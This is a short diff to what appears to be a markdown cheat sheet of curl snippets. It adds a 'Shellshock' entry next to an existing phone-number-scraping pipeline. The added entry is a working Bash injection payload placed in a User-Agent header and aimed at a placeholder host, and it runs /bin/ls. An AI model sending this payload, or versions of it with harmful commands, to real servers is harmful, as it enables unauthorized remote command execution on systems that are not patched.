@@ -331,6 +331,11 @@ curl http://www.foo.com 2>/dev/null \
 | grep -io '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -.]\?[0-9]\{3\}[ -.]\?\([0-9]\{4\}\|[A-Z]\{4\}\)'
 ```
 
+- Shellshock
+```
+curl -H "User-Agent: () { :; }; /bin/ls" http://vulnerablesitegoeshere.net/
+```
+
 # Windows Platform Tokens
 
 These strings are found in user agent strings in browsers amongst
